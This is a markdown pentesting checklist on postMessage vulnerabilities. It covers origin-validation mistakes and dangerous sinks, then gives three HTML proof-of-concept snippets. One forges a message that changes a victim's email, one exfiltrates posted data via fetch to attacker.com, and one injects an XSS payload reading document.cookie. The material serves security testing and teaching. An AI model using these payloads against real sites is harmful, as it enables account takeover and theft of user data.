# postMessage Vulnerabilities

A way for different browser windows/iframes to communicate cross-origin.

## Checks

- [ ] Look for `window.addEventListener("message", ...)` handlers in JS
- [ ] Check if the origin is validated at all
- [ ] Check for misconfigured regex in origin validation
  - Missing anchors (`^` and `$`)
  - Unescaped dots (`.` matches any character)
  - Partial matches (e.g., `evil-target.com` passing a check for `target.com`)
- [ ] Check if `event.data` is passed to dangerous sinks
  - `innerHTML`
  - `eval()`
  - `document.write()`
  - `location.href`
  - `jQuery.html()`
- [ ] Look for `postMessage` calls that send sensitive data — check if `targetOrigin` is `*`
- [ ] Check for message handlers that perform state-changing actions (e.g., updating settings, changing email)

## Exploitation

### Sending a malicious message

If a target page has a vulnerable message handler with no origin check:

```html
<iframe src="https://target.com/vulnerable-page" id="target"></iframe>
<script>
  let target = document.getElementById("target");
  target.onload = function () {
    target.contentWindow.postMessage(
      '{"action":"update","email":"attacker@evil.com"}',
      "*",
    );
  };
</script>
```

### Stealing data from postMessage

If the target sends data via `postMessage` with `targetOrigin: '*'`:

```html
<iframe src="https://target.com/page-that-posts-data" id="target"></iframe>
<script>
  window.addEventListener("message", function (event) {
    fetch("https://attacker.com/log?data=" + encodeURIComponent(event.data));
  });
</script>
```

### Chaining with [XSS](xss.md)

If the message handler writes `event.data` into `innerHTML`:

```html
<iframe src="https://target.com/vulnerable-page" id="target"></iframe>
<script>
  let target = document.getElementById("target");
  target.onload = function () {
    target.contentWindow.postMessage(
      "<img src=x onerror=alert(document.cookie)>",
      "*",
    );
  };
</script>
```

## Tools

- Browser DevTools → Sources → Event Listener Breakpoints → Message
- [Posta](https://github.com/nicholasaleks/posta) - postMessage analysis browser extension

---

## References

- [MDN - postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
- [PortSwigger - DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based)
